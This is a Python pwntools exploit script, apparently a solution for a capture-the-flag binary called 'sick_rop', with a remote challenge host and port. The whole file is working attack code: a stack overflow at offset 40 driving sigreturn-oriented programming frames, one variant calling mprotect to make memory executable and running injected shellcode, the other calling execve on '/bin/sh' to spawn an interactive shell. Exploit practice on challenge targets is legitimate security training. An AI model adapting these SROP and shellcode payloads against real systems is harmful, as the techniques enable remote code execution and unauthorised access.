from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sick_rop'
context.arch = "amd64"
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '159.65.26.210', 31623

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
entry = 0x40104f 
syscall = 0x401014
ret = 0x401016

def mprotect_exploit():
    io = initialize()

    sigframe = SigreturnFrame()
    sigframe.rax = 0xa          # mprotect()
    sigframe.rdi = 0x401000     # memory area
    sigframe.rsi = 0x1000       # size
    sigframe.rdx = 7            # read/write/exec access
    sigframe.rsp = 0x4010d8     # symtab pointer to vuln(), act as next. pwndbg> search -t dword 0x40102e
    sigframe.rip = syscall

    offset = 40
    payload = flat({
        offset: [
            elf.sym['vuln'],    # return to vuln again for a 2nd read with sigframe on the stack
            syscall,            # call syscall after 2nd read that sets up RAX to 15
            bytes(sigframe)
        ]
    })
    io.sendline(payload)        # setting the sigframe
    sleep(0.5)
    io.sendline(b'A' * (15-1))  # Sigreturn RAX = 15
    io.recv()                   # remove garbo that is printed our
    
    shellcode = asm(shellcraft.sh())
    payload = flat({
        offset: [
            0x4010b8 + offset + 8,   # grabbed from gdb
            shellcode
        ]
    })
    io.sendline(payload)
    io.recv()                   # remove garbo that is printed our
    
    io.interactive()
    
def execve_exploit():
    io = initialize()

    sigframe = SigreturnFrame()
    sigframe.rax = 0xa          # mprotect()
    sigframe.rdi = 0x401000     # memory area
    sigframe.rsi = 0x1000       # size
    sigframe.rdx = 7            # read/write/exec access
    sigframe.rsp = 0x4010d8     # symtab pointer to vuln(), act as next. pwndbg> search -t dword 0x40102e
    sigframe.rip = syscall

    offset = 40
    payload = flat({
        offset: [
            elf.sym['vuln'],    # return to vuln again for a 2nd read with sigframe on the stack
            syscall,            # call syscall after 2nd read that sets up RAX to 15
            bytes(sigframe)
        ]
    })
    io.send(payload)    # setting the sigframe
    sleep(0.5)
    io.send(b'A' * 15)  # Sigreturn RAX = 15
    io.recv()           # remove garbo that is printed out
    sleep(0.5)
    
    sigframe = SigreturnFrame()
    sigframe.rax = 0x3b         # execve()
    sigframe.rdi = 0x4010d8 - 32 + 40 + 8 + 8 + len(sigframe)       # points to /bin/sh
    sigframe.rsi = 0
    sigframe.rdx = 0
    sigframe.rsp = 0x4010d8     # symtab pointer to vuln(), act as next. pwndbg> search -t dword 0x40102e
    sigframe.rip = syscall
    
    payload = flat({
        offset: [
            elf.sym['vuln'],    # return to vuln again for a 2nd read with sigframe on the stack
            syscall,            # call syscall after 2nd read that sets up RAX to 15
            bytes(sigframe)
        ]
    })
    payload += b'/bin/sh\x00'
    io.send(payload)    # setting the sigframe
    sleep(0.5)
    io.send(b'A' * 15)  # Sigreturn RAX = 15
    io.recv()           # remove garbo that is printed out
    
    io.interactive()
    
if __name__ == '__main__':
    # mprotect_exploit()
    execve_exploit()